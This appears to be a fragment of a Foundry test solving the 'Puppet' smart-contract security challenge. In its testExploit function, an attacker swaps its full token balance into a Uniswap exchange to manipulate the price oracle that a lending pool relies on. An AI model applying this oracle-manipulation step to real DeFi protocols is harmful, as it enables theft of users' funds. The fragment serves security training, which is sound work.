...
contract Puppet is Test {
    ...
    function testExploit() public {
        ...
        uint256 ethPayout = uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE);

        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 9 ether,(block.timestamp * 2));
